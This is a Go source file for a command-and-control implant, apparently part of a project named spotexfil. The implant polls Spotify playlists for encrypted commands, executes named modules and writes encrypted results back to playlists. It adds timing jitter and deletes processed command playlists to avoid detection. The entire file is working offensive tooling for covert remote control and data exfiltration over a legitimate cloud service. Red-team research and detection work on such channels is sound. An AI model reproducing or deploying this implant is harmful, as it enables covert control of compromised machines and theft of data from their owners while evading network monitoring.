package c2

import (
	"context"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
)

// Implant polls for commands and executes them.
type Implant struct {
	client        *spotify.Client
	key           string
	interval      int
	jitter        int
	processedSeqs map[int]bool
}

// NewImplant creates a new implant.
func NewImplant(client *spotify.Client, key string, interval, jitter int) *Implant {
	return &Implant{
		client:        client,
		key:           key,
		interval:      interval,
		jitter:        jitter,
		processedSeqs: make(map[int]bool),
	}
}

// Run starts the main polling loop.
func (imp *Implant) Run() {
	fmt.Println("[*] Implant started, polling for commands...")

	for {
		imp.pollAndExecute()
		sleepTime := imp.interval + rand.Intn(2*imp.jitter+1) - imp.jitter
		if sleepTime < 10 {
			sleepTime = 10
		}
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}

func (imp *Implant) pollAndExecute() {
	ctx := context.Background()

	seqGroups, err := imp.client.ReadC2Playlists(ctx,
		protocol.ChannelCmd, imp.key, -1)
	if err != nil {
		fmt.Printf("[!] Poll error: %v\n", err)
		return
	}

	if len(seqGroups) == 0 {
		return
	}

	for seqNum, chunkMetas := range seqGroups {
		if imp.processedSeqs[seqNum] {
			_ = imp.client.CleanC2Playlists(ctx,
				protocol.ChannelCmd, imp.key, seqNum)
			continue
		}

		payload := protocol.ReassemblePayload(chunkMetas)
		cmdDict, err := protocol.DecodeMessage(payload, imp.key)
		if err != nil {
			errStr := strings.ToLower(err.Error())
			if strings.Contains(errStr, "tag") || strings.Contains(errStr, "decrypt") || strings.Contains(errStr, "cipher") {
				fmt.Printf("[!] Decryption failed for seq=%d: encryption key mismatch with operator?\n", seqNum)
			} else {
				fmt.Printf("[!] Failed to decode seq=%d: %v\n", seqNum, err)
			}
			_ = imp.client.CleanC2Playlists(ctx,
				protocol.ChannelCmd, imp.key, seqNum)
			continue
		}

		msg := protocol.FromCommandMap(cmdDict)
		fmt.Printf("[*] Executing seq=%d module=%s\n", seqNum, msg.Module)

		result := imp.execute(msg)
		imp.sendResult(ctx, result)
		_ = imp.client.CleanC2Playlists(ctx,
			protocol.ChannelCmd, imp.key, seqNum)
		imp.processedSeqs[seqNum] = true
	}
}

func (imp *Implant) execute(msg *protocol.C2Message) *protocol.C2Message {
	mod := GetModule(msg.Module)
	if mod == nil {
		return &protocol.C2Message{
			Module: msg.Module,
			Seq:    msg.Seq,
			Status: "error",
			Data:   fmt.Sprintf("Unknown module: %s", msg.Module),
		}
	}

	status, data := mod.Execute(msg.Args)
	return &protocol.C2Message{
		Module: msg.Module,
		Seq:    msg.Seq,
		Status: status,
		Data:   data,
	}
}

func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) {
	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
	if err != nil {
		fmt.Printf("[!] Failed to encode result seq=%d: %v\n", result.Seq, err)
		return
	}

	chunks, err := protocol.ChunkPayload(encoded, result.Seq,
		protocol.ChannelRes, imp.key)
	if err != nil {
		fmt.Printf("[!] Failed to chunk result seq=%d: %v\n", result.Seq, err)
		return
	}

	if err := imp.client.WriteC2Playlists(ctx, chunks); err != nil {
		fmt.Printf("[!] Failed to send result seq=%d: %v\n", result.Seq, err)
		return
	}

	fmt.Printf("[*] Result sent for seq=%d\n", result.Seq)
}
